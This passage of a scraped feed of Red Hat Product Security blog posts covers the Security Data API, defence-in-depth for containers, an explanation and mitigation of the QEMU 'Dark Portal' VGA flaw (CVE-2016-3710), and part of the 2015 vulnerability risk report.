form-type-item\">\n  <label>Language </label>\n English\n</div>\n<div id=\"comment-wrapper-nid-2695561\"></div>","pubDate":"Mon, 17 Oct 2016 13:30:00 +0000","dc:creator":"Mark J. Cox","guid":{"@isPermaLink":"false","#text":"2695561 at https://access.redhat.com"}},{"title":"Redefining how we share our security data.","link":"https://access.redhat.com/blogs/766093/posts/2387601","description":"<div class=\"field field-name-body field-type-text-with-summary field-label-hidden \">\n\n    <p>Red Hat Product Security has long provided various bits of machine-consumable information to customers and users via our <a href=\"https://www.redhat.com/security/data/metrics/\">Security Data</a> page.  Today we are pleased to announce that we have made it even easier to access and parse this data through our new Security Data API service.</p>\n<p>While we have provided this information since January 2005, it required end users to download the content from the site, which meant you either downloaded many files and kept a local copy, or you were downloading large files on a regular basis.  It also meant that, as part of writing the parser, if you were looking for certain criteria, you had to account for that criteria in your parser, which could make it more complex and difficult to write.</p>\n<p>Although the Security Data API doesn’t remove the need for a parser (you need something to handle the provided data), it does offer a lot of search options so that you can leverage the API to obtain real time data.</p>\n<p>So what information can you obtain via the API?  Currently it provides CVE information for flaws that affected components we ship in supported products, as well as CVRF (Common Vulnerability Reporting Framework) documents and OVAL (Open Vulnerability Assessment Language) definitions.  While CVRF documents and OVAL definitions are provided in their native XML format, the API also provides that information in JSON format for easier parsing.  This means that you can use any CVRF or OVAL parser with the feed, and you can also write your own JSON parser to get the representative data for them as well.</p>\n<p>Most users will be interested in the CVE data, which we have been providing as part of our <a href=\"https://access.redhat.com/security/security-updates/#/cve\">CVE database</a> since August 2009.  If you wanted to get information on CVE-2016-0800, for instance, you would visit the CVE page: <a href=\"https://access.redhat.com/security/cve/CVE-2016-0800\">https://access.redhat.com/security/cve/CVE-2016-0800</a>.  If you were using this information for some vulnerability assessment or reporting, you would have had to do some web scraping and involve other documents on our Security Data page.</p>\n<p>With the Security Data API you can view the information for this CVE in two ways: <a href=\"https://access.redhat.com/labs/securitydataapi/cve/CVE-2016-1953.xml\">XML</a> and <a href=\"https://access.redhat.com/labs/securitydataapi/cve/CVE-2016-1953.json\">JSON</a>.  This uses our own markup to describe the flaw, and from this view you can see the CVSSv2 score and metrics (or CVSSv3 score and metrics), as well as impact rating, links to Bugzilla, the date it went public, and other details of the flaw.</p>\n<p>While this is interesting, and we think it will be incredibly useful, the really compelling part of the API is the search queries you can perform.  For instance, if you wanted to find all Critical impact flaws with a CVSSv2 score of 8 or greater, you would visit <a href=\"https://access.redhat.com/labs/securitydataapi/cve.json?severity=critical&amp;cvss_score=8.0\">https://access.redhat.com/labs/securitydataapi/cve.json?severity=critical&amp;cvss_score=8.0</a> and get a nice JSON output of CVEs that meet this criteria.</p>\n<p>If you wanted to find all CVEs that were public a week ago (assuming today is June 1st 2016), you would use <a href=\"https://access.redhat.com/labs/securitydataapi/cve.json?after=2016-05-24\">https://access.redhat.com/labs/securitydataapi/cve.json?after=2016-05-24</a> and if you further wanted to get only those that affected the firefox package, you would use <a href=\"https://access.redhat.com/labs/securitydataapi/cve.json?after=2016-05-24&amp;package=firefox\">https://access.redhat.com/labs/securitydataapi/cve.json?after=2016-05-24&amp;package=firefox</a>.</p>\n<p>Perhaps you only want information on the CVEs that were addressed in RHSA-2016:1217.  You could use <a href=\"https://access.redhat.com/labs/securitydataapi/cve.json?advisory=RHSA-2016:1217\">https://access.redhat.com/labs/securitydataapi/cve.json?advisory=RHSA-2016:1217</a> to get the list of CVEs and some of their details and then iterate through the CVEs to get further details of each.</p>\n<p>The same search parameters are available for CVRF documents and OVAL definitions.  You have the flexibility to obtain the details via XML or JSON.  The ability to get the data in multiple formats allows you to write parsers for any of these formats and also allows you to write the parsers in any language you choose.  These parsers can further take arguments such as severity, date ranges, CVSS scores, CWE identifiers, package names and more, which are in turn used as search criteria when using the API.</p>\n<p>Red Hat Product Security strives to be as transparent as possible when it comes to how we handle security flaws, and the Security Data page has been the primary source of this information, as far as machine-consumable content is concerned.  With the availability of the Security Data API, we think this is the best and most user-friendly way to consume this content and are pleased to provide it.  Being able to programmatically obtain this information on-the-fly will now allow Red Hat customers and users to generate all kinds of interesting reports, or enhance existing reports, all in real-time.</p>\n<p>We are also pleased to say that the beta API does not require any kind of authentication or login to access and it is available for anyone to use.</p>\n<p>There is one last thing to note, however.  The API, at this time, is in beta and the structure of the content, including how it is searched, may change at any time without any prior notification.  We will be only supporting this one version of the API for now, however if we make any changes we will note that in the documentation.</p>\n<p>For further information and instructions on how to use the API, please visit the <a href=\"https://access.redhat.com/documentation/en/red-hat-security-data-api/version-0.1/red-hat-security-data-api/\">Security Data API documentation</a>. If you encounter an error in any of the data, please <a href=\"https://access.redhat.com/security/team/contact\">contact us</a> and let us know.</p></div><div class=\"form-item form-type-item\">\n  <label>Language </label>\n English\n</div>\n<div id=\"comment-wrapper-nid-2387601\"></div><div class=\"field field-name-field-kcs-tags-select field-type-taxonomy-term-reference field-label-above \">\n\t<h2 class=\"field-label\">\n\t\t\t\tTags\t</h2>\n\n    security</div>","pubDate":"Thu, 23 Jun 2016 13:30:00 +0000","dc:creator":"Vincent Danen","guid":{"@isPermaLink":"false","#text":"2387601 at https://access.redhat.com"}},{"title":"The Answer is always the same: Layers of Security","link":"https://access.redhat.com/blogs/766093/posts/2334141","description":"<div class=\"field field-name-body field-type-text-with-summary field-label-hidden \">\n\n    <p>There is a common misperception that now that containers support seccomp we no longer need SELinux to help protect our systems.  WRONG.  The big weakness in containers is the container possesses the ability to interact with the host kernel and the host file systems.  Securing the container processes is all about shrinking the attack surface on the host OS and more specifically on the host kernel.</p>\n<p>seccomp does a great job of shrinking the attack surface on the kernel.  The idea is to limit the number of syscalls that container processes can use. It is an awesome feature.  For example, on an x86_64 bit machine, there are around 650 system calls.  If the Linux Kernel has a bug in any one of these syscalls, a process could get the kernel to turn off security features and take over the system, i.e. it would break out of confinement.  If your container does not run 32 bit code, you can turn on seccomp and eliminate all x86 syscalls, basically cutting the number of syscalls in half.  This means that if the kernel had a bug in a 32 bit syscall that allowed the process to take over the system, this syscall would not be available to the processes in your container, and the container would not be able to break out.  We also eliminate a lot of other syscalls that we do not expect processes inside of a container to call.</p>\n<h2>But seccomp is not enough</h2>\n<p>This still means that if a bug remains in the kernel that can be triggered in the 300 remaining syscalls, then the container process can still take the system over, and/or create havoc. Just having open/read/write/ioctl on things like files/devices etc, could allow a container process the ability to break out.  And if they break out they would be able to write all over the system.</p>\n<p>You could continue to shrink the seccomp syscall table to such a degree that processes can not escape, but at some point it will also prevent the container processes getting any real work done.</p>\n<h2><a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FDefense_in_depth_%2528computing%2529\">Defense in Depth</a></h2>\n<p>As usual, any single security mechanism by itself will not fully protect your containers. You need lots of security mechanisms to control what a process can do inside and outside a container.</p>\n<ul>\n<li>\n<p><strong>Read-Only file systems.</strong>  Prevent open/write on kernel file systems. Container processes need read access to kernel file systems like /proc, /sys, /sys/fs ...  But they seldom need write access.</p>\n</li>\n<li>\n<p><strong>Dropping privileged process capabilities.</strong>  This can prevent things like setting up the network or mounting file systems, (seccomp can also block some of these, but not as comprehensively as capabilities).</p>\n</li>\n<li>\n<p><strong>SELinux.</strong> Prevents which file system objects like files, devices, sockets, and directories a container process can read/write/execute. Since your processes in a container will need to use open/read/write/exec syscalls, SELinux controls which file system<br />\nobjects you can interact with.  I have heard a great analogy, <em>SELinux is telling people which people they can talk to, seccomp is telling them what they can say.</em></p>\n</li>\n<li>\n<p><strong>prctl(NO__NEW__PRIVS).</strong> Prevents privilege escalation through the use of setuid applications.  Running your container<br />\nprocesses without privileges is always a good idea, and this keeps the processes non privileged.</p>\n</li>\n<li>\n<p><strong>PID Namespace.</strong> Makes it harder to see other processes on the system that are not in your container.</p>\n</li>\n<li>\n<p><strong>Network Namespace.</strong> Controls which networks your container processes are able to see.</p>\n</li>\n<li>\n<p><strong>Mount Namespace.</strong> Hides large parts of the system from the processes inside of the container.</p>\n</li>\n<li>\n<p><strong>User Namespace.</strong> Helps remove remaining system capabilities.  It can allow you to have privileges inside of your containers namespaces, but not outside of the container.</p>\n</li>\n<li>\n<p><strong>kvm.</strong> If you can find some way to run containers in a kvm/virtualization wrapper, this would be a lot more secure. (ClearLinux and others are working on this).</p>\n</li>\n</ul>\n<p>The more Linux security services that you can wrap around your container processes the more secure your system will be.</p>\n<h2>Bottom Line</h2>\n<p>It is the combination of all of these kernel services along with administrators continuing to maintain good security practices that begin to <strong>keep your container processes contained</strong>.</p></div><div class=\"form-item form-type-item\">\n  <label>Language </label>\n English\n</div>\n<div id=\"comment-wrapper-nid-2334141\"></div><div class=\"field field-name-field-product field-type-taxonomy-term-reference field-label-above \">\n\t<h2 class=\"field-label\">\n\t\t\t\tProduct\t</h2>\n\n    Red Hat Enterprise Linux</div><div class=\"field field-name-field-kcs-a-category-select field-type-taxonomy-term-reference field-label-above \">\n\t<h2 class=\"field-label\">\n\t\t\t\tCategory\t</h2>\n\n    Secure</div><div class=\"field field-name-field-kcs-tags-select field-type-taxonomy-term-reference field-label-above \">\n\t<h2 class=\"field-label\">\n\t\t\t\tTags\t</h2>\n\n    containers    docker    security    selinux</div>","pubDate":"Wed, 25 May 2016 13:30:00 +0000","dc:creator":"rhn-engineering-dwalsh","guid":{"@isPermaLink":"false","#text":"2334141 at https://access.redhat.com"}},{"title":"CVE-2016-3710: QEMU: out-of-bounds memory access issue","link":"https://access.redhat.com/blogs/766093/posts/2309211","description":"<div class=\"field field-name-body field-type-text-with-summary field-label-hidden \">\n\n    <p>Quick Emulator (aka <a href=\"https://access.redhat.com/bounce/?externalURL=http%3A%2F%2Fqemu.org%2F\">QEMU</a>) is an open source systems emulator. It emulates various processors and their accompanying hardware peripherals like disc, serial ports, NIC et al. A serious vulnerability of out-of-bounds r/w access through the Video Graphics Array (<a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FVideo_Graphics_Array\">VGA</a>) emulator was discovered and reported by <strong>Mr Wei Xiao and Qinghao Tang of Marvel Team at 360.cn Inc.</strong> This vulnerability is formally known as <strong><a href=\"http://bugzilla.redhat.com/CVE-2016-3710\">Dark Portal</a></strong>. In this post we'll see how <strong>Dark Portal</strong> works and its mitigation.</p>\n<p>VGA is a hardware component primarily responsible for drawing content on a display device. This content could be text or images at various resolutions. The VGA controller comes with its own processor (<a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FGraphics_processing_unit\">GPU</a>) and its own RAM. Size of this RAM varies from device to device. The VGA emulator in QEMU comes with the default memory of <strong>16 MB</strong>. The systems' CPU maps this memory, or parts of it, to supply graphical data to the GPU.</p>\n<p>The VGA standard has evolved and many extensions to it have been devised to support higher resolutions or new hardware. The  <strong>VESA BIOS Extensions</strong>  (<a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FVESA_BIOS_Extensions\">VBE</a>) is a software interface implemented in VGA BIOS and <a href=\"https://access.redhat.com/bounce/?externalURL=http%3A%2F%2Fwiki.osdev.org%2FBochs_VBE_extensions\">Boch VBE exntension</a> is a set of registers designed to support Super VGA (<a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FSuper_video_graphics_array\">SVGA</a>) hardware. QEMU VGA emulator implements both VBE and Boch VBE extensions. It provides two ways to access its video memory:</p>\n<ul>\n<li><strong>Linear Frame buffer:</strong> In this, entire video RAM is accessed by the CPU like a byte addressed array in C.</li>\n<li><strong>Bank Switching:</strong> A chunk (or bank) of <strong>64 KB</strong> of video memory is mapped into host's memory. Host CPU could slide this 64KB window, to access other parts of the video memory.</li>\n</ul>\n<p>VBE has numerous registers to hold information about memory bank's size, offset etc. parameters. These registers can be manipulated using VGA I/O port r/w functions. A register <strong>VBE_DISPI_INDEX_BANK</strong> holds the offset address in the currently used bank (or window) of the VGA memory. In order to update the display pixel, GPU must calculate its location on the screen and its offset within current memory bank.</p>\n<p><strong>QEMU VGA emulator in action:</strong></p>\n<p>In QEMU's VGA emulator, user could set the offset <strong>VBE_DISPI_INDEX_BANK</strong> register via <strong>vbe_ioport_write_data()</strong> routine</p>\n<pre><code>        void vbe_ioport_write_data() {\n            ...\n            case VBE_DISPI_INDEX_BANK:\n                ...\n                s-&gt;bank_offset = (val &lt;&lt; 16);\n        }\n</code></pre><p>The VGA read/write functions <strong>vga_mem_readb()</strong> and <strong>vga_mem_writeb()</strong> compute the pixel location using the supplied address and bank_offset values</p>\n<pre><code>        uint32_t vga_mem_readb/writeb(VGACommonState *s, hwaddr addr, ...) {\n            ...\n            switch(memory_map_mode) {\n            case 1:\n                ...\n                addr += s-&gt;bank_offset;\n                break;\n             ...\n             /* standard VGA latched access */\n             s-&gt;latch = ((uint32_t *)s-&gt;vram_ptr)[addr];\n        }\n</code></pre><p>The said out-of-bounds r/w access issue occurs because it accesses the byte(uint8_t *) addressed video memory, as double word(uint32_t *) type. This type promotion throws the given pixel location address beyond the <strong>16 MB</strong> VGA memory.</p>\n<p><strong>Impact:</strong></p>\n<p>This issue affects all QEMU/KVM and Xen guests wherein VGA emulator is enabled. Depending on where the OOB access lands in host memory, it could lead to information disclosure OR crash the QEMU process resulting in DoS. It could potentially be leveraged to execute arbitrary code with privileges of the QEMU process on the host.</p>\n<p><strong>Mitigation:</strong></p>\n<p>The <strong><a href=\"https://access.redhat.com/bounce/?externalURL=http%3A%2F%2Fwww.selinuxproject.org%2Fpage%2FSVirt\">sVirt</a></strong> and <strong><a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FSeccomp\">Seccomp</a></strong> functionalities used to restrict host's QEMU process privileges and resource access might mitigate the impact of successful exploitation of this issue. Also a possible policy-based workaround is to avoid granting untrusted users administrator privileges within guests.</p>\n<p><strong>Conclusion:</strong></p>\n<p>VGA VBE registers can  be manipulated by a privileged user inside guest. It leads to an  out-of-bounds memory access in QEMU process on the host, essentially making it an attack on the virtualisation host by a guest.</p></div><div class=\"form-item form-type-item\">\n  <label>Language </label>\n English\n</div>\n<div id=\"comment-wrapper-nid-2309211\"></div><div class=\"field field-name-field-product field-type-taxonomy-term-reference field-label-above \">\n\t<h2 class=\"field-label\">\n\t\t\t\tProduct\t</h2>\n\n    Red Hat Enterprise Linux</div><div class=\"field field-name-field-kcs-component-select field-type-taxonomy-term-reference field-label-above \">\n\t<h2 class=\"field-label\">\n\t\t\t\tComponent\t</h2>\n\n    kvm</div>","pubDate":"Wed, 11 May 2016 13:30:00 +0000","dc:creator":"Prasad Pandit","guid":{"@isPermaLink":"false","#text":"2309211 at https://access.redhat.com"}},{"title":"﻿Red Hat Product Security Risk Report: 2015","link":"https://access.redhat.com/blogs/766093/posts/2262281","description":"<div class=\"field field-name-body field-type-text-with-summary field-label-hidden \">\n\n    <p>This report takes a look at the state of security risk for Red Hat products for calendar year 2015. We look at key metrics, specific vulnerabilities, and the most common ways users of Red Hat products were affected by security issues.</p>\n<p>Our methodology is to look at how many vulnerabilities we addressed and their severity, then look at which issues were of meaningful risk, and which were exploited. All of the data used to create this report is available from <a href=\"https://www.redhat.com/security/data/metrics/\">public data</a> maintained by Red Hat Product Security.</p>\n<p>Red Hat Product Security assigns a <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FCommon_Vulnerabilities_and_Exposures\">Common Vulnerabilities and Exposures</a> (CVE) name to every security issue we fix. If we fix a bug that later turns out to have had a security implication we’ll go back and assign a CVE name to that issue retrospectively. Every CVE fixed has an entry in our <a href=\"https://access.redhat.com/security/security-updates/#/cve\">public CVE database</a> in the <a href=\"https://access.redhat.com/\">Red Hat Customer Portal</a> as well as a public bug that has more technical detail of the issue. Therefore, for the purposes of this report we will equate vulnerabilities to CVEs.</p>\n<p><strong>Note:</strong> Vulnerability counts can be used for comparing Red Hat issues within particular products or dates because we apply a consistent methodology on how we allocate names and how we score their severity. You should not use vulnerability count data (such as the number of CVEs addressed) to compare with any other product from another company, because the methodology used to assign and report on vulnerabilities varies. Even products from different vendors that are affected by the same CVE can have variance in the severity of the CVE given the unique way the product is built or integrated.</p>\n<h2>Vulnerabilities</h2>\n<p>Across all Red Hat products, and for all issue severities, we fixed more than 1300 vulnerabilities by releasing more than 600 security advisories in 2015. At first that may seem like a lot of vulnerabilities, but for a given user only a subset of those issues will be applicable for the products and versions of the products in use. Even then, within a product such as Red Hat Enterprise Linux, not every package is installed in a default or even likely installation.</p>\n<p>Red Hat rates vulnerabilities using a <a href=\"https://access.redhat.com/security/updates/classification\">4 point scale</a> designed to be an at-a-glance guide to the amount of concern Red Hat has for each security issue. This scale is designed to align as closely as possible with similar scales from other open source groups and enterprise vendors, such as Microsoft. The severity levels are designed to help users determine which advisories mattered the most. Providing a prioritised risk assessment helps customers understand and better schedule upgrades to their systems, being able to make a more informed decision about the risk that each issue places on their unique environment.</p>\n<p>Since 2009, we also publish <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FCVSS\">Common Vulnerability Scoring System</a> (CVSS) scores for every vulnerability addressed to aid customers who use CVSS scoring for their internal processes. However, CVSS scores have some limitations and we do not use CVSS as a way to prioritise vulnerabilities.</p>\n<p>The 4 point scale rates vulnerabilities as Low, Moderate, Important, or Critical.</p>\n<p>Vulnerabilities rated Critical in severity can pose the most risk to an organisation. By definition, a Critical vulnerability is one that could potentially be exploited remotely and automatically by a worm. However we, like other vendors, also stretch the definition to include those flaws that affect web browsers or plug-ins where a user only needs to visit a malicious (or compromised) website in order to be exploited. These flaws actually account for the majority of the Critical issues fixed as we will show in this report. If you’re using a Red Hat product that does not have a desktop, for example, you’ll be affected by a lot less Critical issues.</p>\n<p>The table below gives some examples for advisory and vulnerability counts for a subset of products and product families. A given Red Hat advisory may fix multiple vulnerabilities across multiple versions of a product. Therefore, a count of vulnerabilities can be used as an estimate of the amount of effort in understanding the issues and fixes. A count of advisories can be used as an estimate of the amount of effort to understand and deploy updates.</p>\n<p><img src=\"https://access.redhat.com/sites/default/files/risk_report_security_advisories_and_vulnerabilities_final_v2.jpg\" /></p>\n<p>One product broken out in the table is Red Hat Enterprise Linux 6.  During Red Hat Enterprise Linux 6 installation, the user <a href=\"http://www.redhat.com/docs/manuals/enterprise/RHEL-4-Manual/x8664-multi-install-guide/s1-pkgselection.html\">gets a choice</a> of installing either the default selection of packages, or making a custom selection. If the user installs a “default” “server” and does not add any additional packages or layered products, then in 2015 there were just 6 Critical and 19 Important security advisories applicable to that system (and 29 advisories that also addressed moderate/low issues).</p>\n<p>Where there are more advisories shown than vulnerabilities (such as for OpenStack), this is because the same vulnerability may affect multiple currently supported versions of the product, each version got it’s own security advisory.</p>\n<p>In 2015, for every Red Hat product there were 112 Critical Red Hat security advisories released addressing 373 Critical vulnerabilities. 82% of the Critical issues had updates available to address them the same or next day after the issue was public. 99% of Critical vulnerabilities were addressed within a week of the issue being public.</p>\n<p>Looking at just the subset of issues affecting base Red Hat Enterprise Linux releases, there were 46 Critical Red Hat security advisories released addressing 61 Critical vulnerabilities.  96% of the Critical issues had updates available to address them the same or next day after the issue was public.</p>\n<p>For Red Hat Enterprise Linux, server installations will generally be affected by far fewer Critical vulnerabilities, just because most Critical vulnerabilities occur in browsers or browser components. A great way to reduce risk when using our modular products is to make sure you install the right variant, and review the package set to remove packages you don’t need.</p>\n<h2>Vulnerability trending</h2>\n<p>The number of vulnerabilities addressed by Red Hat year on year is increasing as a function of new products and versions of products being continually added. However, for any given version of a product we find that the number of vulnerabilities being fixed actually decreases over time. This is influenced by Red Hat backporting security fixes.</p>\n<p>We use the term backporting to describe the action of taking a fix for a security flaw out of the most recent version of an upstream software package and <a href=\"https://access.redhat.com/security/updates/backporting\">applying that fix to an older version of the package we distribute</a>. Backporting is common among vendors like Red Hat and is essential to ensuring we can deploy automated updates to customers with minimal risk.</p>\n<p><img src=\"/sites/default/files/riskreport_securitytimeline_final.png\" class=\"image-large\" /></p>\n<p>The trends can be investigated using our public data, and from time to time we do Risk Reports that delve into a given product and version.  For example see <a href=\"https://access.redhat.com/blogs/766093/posts/1976423\">our Red Hat Enterprise Linux 6.5 to 6.6 Risk Report</a>.</p>\n<h2>What issues really mattered in 2015</h2>\n<p>In 2014, the OpenSSL Heartbleed vulnerability started a trend of branding vulnerabilities changing the way security vulnerabilities affecting open source software were being reported and perceived. Vulnerabilities are found and fixed all of the time, and just because a vulnerability gets a catchy name, fancy logo, or media attention doesn’t mean it’s of real risk to users.</p>\n<p>So let’s take a chronological tour through 2015 to see which issues got branded or media attention, but more importantly which issues actually mattered for Red Hat customers.</p>\n<p><img src=\"/sites/default/files/riskreport_tour2015vulnerabilities_final.png\" class=\"image-large\" /></p>\n<h3>“<a href=\"https://access.redhat.com/articles/1332213\">Ghost</a>” (January 2015) <a href=\"https://access.redhat.com/security/cve/cve-2015-0235\">CVE-2015-0235</a></h3>\n<p>A bug was found affecting certain function calls in the glibc library. A remote attacker that was able to make an application call to an affected function could execute arbitrary code. While a proof of concept exploit is available, as is a Metasploit module targeting Exim, not many applications were found to be vulnerable in a way that would have allowed remote exploitation.</p>\n<p>Red Hat Enterprise Linux versions were affected. This was given Critical impact, and updates were available the same day the issue was public. This issue was given enhanced coverage in the Red Hat Customer Portal, with a banner on all pages and a customer outreach email campaign.</p>\n<h3>“<a href=\"https://access.redhat.com/blogs/766093/posts/1976563\">Freak</a>” (March 2015) <a href=\"https://access.redhat.com/security/cve/cve-2015-0204\">CVE-2015-0204</a></h3>\n<p>A flaw was found in the cryptography library OpenSSL where clients accepted EXPORT-grade (insecure) keys even when the client had not initially asked for them. This could have been exploited using a man-in-the-middle attack, downgrading to a weak key, factorizing it, then decrypting communication between the client and the server. Like the branded OpenSSL issues from 2014 such as Poodle and CCS Injection, this issue is hard to exploit as it requires a man-in-the-middle attack. We’re therefore not aware of active exploitation of this issue.</p>\n<p>Red Hat Enterprise Linux versions were affected. This was given Moderate impact, and updates were available within a few weeks of the issue being public.</p>\n<h3><a href=\"https://access.redhat.com/articles/1415483\">ABRT</a> (April 2015) <a href=\"https://access.redhat.com/security/cve/cve-2015-3315\">CVE-2015-3315</a></h3>\n<p>ABRT (Automatic Bug Reporting Tool) is a tool to help users detect defects in applications and create a bug report. ABRT was vulnerable to multiple race condition and symbolic link flaws. A local attacker could have used these flaws to potentially escalate their privileges on an affected system to root.</p>\n<p>This issue affected Red Hat Enterprise Linux 7. This was given Important impact, and updates were made available. Other products and versions of Red Hat Enterprise Linux were either not affected, or not vulnerable to privilege escalation.  A working public exploit is available for this issue.</p>\n<h3>JBoss Operations Network open APIs (April 2015) <a href=\"https://access.redhat.com/security/cve/cve-2015-0297\">CVE-2015-0297</a></h3>\n<p>Red Hat JBoss Operations Network is a middleware management solution that provides a single point of control to deploy, manage, and monitor JBoss Enterprise Middleware, applications, and services. The JBoss Operations Network server did not correctly restrict access to certain remote APIs which could have allowed a remote, unauthenticated attacker to execute arbitrary Java methods. We’re not aware of active exploitation of this issue.</p>\n<p>This issue affected versions of JBoss Operations Network. It was given Critical impact, and updates were made available within a week of the issue being public.</p>\n<h3>“<a href=\"https://access.redhat.com/articles/1444903\">Venom</a>” (May 2015) <a href=\"https://access.redhat.com/security/cve/cve-2015-3456\">CVE-2015-3456</a></h3>\n<p>Venom was a branded flaw which affected QEMU. A privileged user of a guest virtual machine could use this flaw to crash the guest or, potentially, execute arbitrary code on the host with the privileges of the host’s QEMU process corresponding to the guest.</p>\n<p>A number of Red Hat products were affected and updates were released the same day as the issue was public. Red Hat products by default would block arbitrary code execution as SELinux sVirt protection confines each QEMU process. We therefore are not aware of any exploitation of this issue.</p>\n<p>This issue was given enhanced coverage in the Red Hat Customer Portal, with a banner on all pages and a customer outreach email campaign.</p>\n<h3>“<a href=\"https://access.redhat.com/articles/1456263\">Logjam</a>” (May 2015) <a href=\"https://access.redhat.com/security/cve/cve-2015-4000\">CVE-2015-4000</a></h3>\n<p>TLS connections using the Diffie-Hellman key exchange protocol were found to be vulnerable to an attack in which a man-in-the-middle attacker could downgrade vulnerable TLS connections to weak cryptography which could then be broken to decrypt the connection.</p>\n<p>This issue affected various cryptographic libraries across several Red Hat products. It was rated Moderate impact and updates were made available.</p>\n<p>Like Poodle and Freak, this issue is hard to exploit as it requires a man-in-the-middle attack. We’re not aware of active exploitation of this issue.</p>\n<h3><a href=\"https://access.redhat.com/articles/1537873\">libuser privilege escalation</a> (July 2015) <a href=\"https://access.redhat.com/security/cve/cve-2015-3246\">CVE-2015-3246</a></h3>\n<p>The libuser library implements an interface for manipulating and administering user and group accounts. Flaws in libuser could allow authenticated local users with shell access to escalate privileges to root.</p>\n<p>Red Hat Enterprise Linux 6 and 7 were affected. This issue was rated Important impact, and updates were made available the same day as issue was made public. Red Hat Enterprise Linux 5 was affected and a mitigation was published.  A public exploit exists for this issue.</p>\n<h3>BIND DoS (July 2015) <a href=\"https://access.redhat.com/security/cve/CVE-2015-5477\">CVE-2015-5477</a></h3>\n<p>A flaw in the Berkeley Internet Name Domain (BIND) allowed a remote attacker to cause named (functioning as an authoritative DNS server or a DNS resolver) to exit, causing a denial of service against BIND.</p>\n<p>This issue affected the versions of BIND shipped with all versions of Red Hat Enterprise Linux. This issue was rated Important impact, and updates were available the same day as the issue was made public.  A public exploit and a Metasploit module exist for this issue.</p>\n<p>Several other similar flaws in BIND leading to denial of service were found and addressed through the year, such as <a href=\"https://access.redhat.com/security/cve/CVE-2015-8704\">CVE-2015-8704</a>, <a href=\"https://access.redhat.com/security/cve/CVE-2015-8000\">CVE-2015-8000</a>, and <a href=\"https://access.redhat.com/security/cve/CVE-2015-5722\">CVE-2015-5722</a>.  Public exploits exist for some of these issues.</p>\n<h3><a href=\"https://access.redhat.com/articles/1563163\">Firefox local file stealing via PDF reader</a> (August 2015) <a href=\"https://access.redhat.com/security/cve/cve-2015-4495\">CVE-2015-4495</a></h3>\n<p>A flaw in Mozilla Firefox could allow an attacker to access local files with the permissions of the user running Firefox. Public exploits exist for this issue, including part of Metasploit, and specifically targeting Linux systems.</p>\n<p>This issue affected Firefox that was shipped with versions of Red Hat Enterprise Linux. It was rated Important impact, and updates were available the following day after the issue was public.</p>\n<h3><a href=\"https://access.redhat.com/articles/1590693\">Firefox add-on permission warning</a> (August 2015) <a href=\"https://access.redhat.com/security/cve/cve-2015-4498\">CVE-2015-4498</a></h3>\n<p>Mozilla Firefox normally warns a user when trying to install an add-on if initiated by a web page. A flaw allowed this dialog to be bypassed. We’re not aware that this issue has been exploited.</p>\n<p>This issue affected Firefox shipped with Red Hat Enterprise Linux versions. It was rated Important impact, and updates were available the same day as the issue was public.</p>\n<h3><a href=\"https://access.redhat.com/security/vulnerabilities/2059393\">Java Deserialization</a> (November 2015) <a href=\"https://access.redhat.com/security/cve/cve-2015-7501\">CVE-2015-7501</a></h3>\n<p>An issue was found in Java Object Serialization affecting the JMXInvokerServlet interface.  This could lead to arbitrary code execution when deserializing Java objects from untrusted sources with the Apache commons-collections library when containing certain risky classes on the classpath.</p>\n<p>This issue impacted many products in the JBoss Middleware suite and updates were made available in November and the following months. Direct exploitation of this vulnerability requires some means of getting an application to accept an object containing one of the risky classes.</p>\n<h3>Grub2 password bypass (December 2015) <a href=\"https://access.redhat.com/security/cve/cve-2015-8370\">CVE-2015-8370</a></h3>\n<p>A flaw was found in the way the grub2 handled backspace characters entered in username and password prompts. An attacker with access to the system console could use this flaw to bypass grub2 password protection.</p>\n<p>This issue only affected Red Hat Enterprise Linux 7. It was rated Moderate severity, and updates were made available within a week.  Steps on how to exploit this issue are public.</p>\n<h3>Various flaws in software in supplementary channels (various dates)</h3>\n<p>Red Hat provides some packages which are not open source software in supplementary channels for users of Red Hat Enterprise Linux. This channel contains software such as Adobe Flash Player, IBM Java, Oracle Java, and Chromium browser.</p>\n<p>A large number of Critical flaws affected these packages. For example, for Adobe Flash Player in 2015, we issued 15 Critical advisories to address nearly 300 Critical vulnerabilities. Linux exploits exist for some of these critical vulnerabilities, 5 having Metasploit modules. As these projects release security updates, we ship appropriate updated packages to customers.</p>\n<p>The issues examined in this section were included because they were meaningful. This includes the issues that are of high severity and likely to be exploited (or already have a public working exploit), as well as issues that were highly visible or branded (with a name or logo or enhanced media attention), regardless of their severity.  See the Venn diagram below for our opinion on the intersection.</p>\n<p><img src=\"/sites/default/files/riskreportgraphics_branded_unbrandeedissues_final_v2.png\" class=\"image-large\" /></p>\n<h2>Lower risk issues with increased customer attention</h2>\n<p>Another way we gauge the level of customer concern around an issue is to measure web traffic, specifically how many page views each of the vulnerability (CVE) pages gets in the Red Hat Customer Portal.</p>\n<p><img src=\"/sites/default/files/riskreport_gaugingcustomerconcern_final.png?\" alt=\"\" class=\"image-large\" /></p>\n<p>The graph above gives an indication of customer interest in given vulnerabilities. Many of the top issues were highlighted earlier in this report. Of the rest, the top viewed issues were ones predominantly affecting Red Hat Enterprise Linux:</p>\n<ul>\n<li><a href=\"https://access.redhat.com/blogs/766093/posts/1976553\">A flaw in Samba</a>, <a href=\"https://access.redhat.com/security/cve/CVE-2015-0240\">CVE-2015-0240</a>, where a remote attacker could potentially execute arbitrary code as root. Samba servers are likely to be internal and not exposed to the internet, limiting the attack surface. No exploits that lead to code execution are known to exist, and some analyses have shown that creation of such a working exploit is unlikely.</li>\n<li>Various flaws in OpenSSL, After high profile issues such as Heartbleed and Poodle in previous years, OpenSSL issues tend to always get increased customer interest independent of the actual severity or risk:\n<ul>\n<li>Two issues, <a href=\"https://access.redhat.com/security/cve/CVE-2015-1793\">CVE-2015-1793</a> and <a 